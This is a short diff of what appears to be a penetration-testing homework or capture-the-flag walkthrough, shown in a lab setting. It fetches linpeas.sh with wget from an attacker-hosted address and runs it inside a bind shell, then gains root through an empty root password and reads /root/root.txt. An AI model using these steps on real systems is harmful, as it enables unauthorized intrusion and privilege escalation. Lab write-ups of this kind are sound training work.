@@ -41,3 +41,10 @@ wget http://192.168.200.107:1234/linpeas.sh
 #Inside the bind shell (admin@backdoor-detection-pentest-homework):
 bash linpeas.sh
 ```
+
+## h 7.6 p
+```bash
+#Inside the bind shell (admin):
+su #Root has an empty password (root::0:0 in /etc/passwd)
+cat /root/root.txt #Submit the flag on the platform
+```
